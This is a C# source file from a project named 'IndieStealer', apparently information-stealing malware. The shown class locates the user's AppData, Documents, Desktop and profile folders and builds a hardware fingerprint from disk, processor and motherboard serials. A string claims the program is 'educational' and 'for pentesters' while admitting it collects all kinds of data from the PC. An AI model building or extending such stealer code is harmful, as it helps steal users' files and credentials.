using System;
using System.IO;
using System.Management;
using IndieStealer.Collect.System;

namespace IndieStealer
{
    static class Info
    {
        #region Directories
        public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string AppdataLocal = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string Temp = Path.GetTempPath();
        public static string Documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        public static string Profile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        public static string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        #endregion
        public static string Error => "Error";
        public const string PentestTool = "This program is made in educational purposes only. This program works with Windows OS. This program does collect all kind of data from your PC. This program is made for pentesters and analyze.";
        public static readonly DateTime DateNow = DateTime.Now;
        public static readonly int UTC = TimeZoneInfo.Local.GetUtcOffset(DateTime.Now).Hours;
        public static readonly string Hwid = MachineMethods.GetHDDSerialNo() + MachineMethods.GetProcessorId() + MachineMethods.GetMBoardSerialNum();   

    }
}
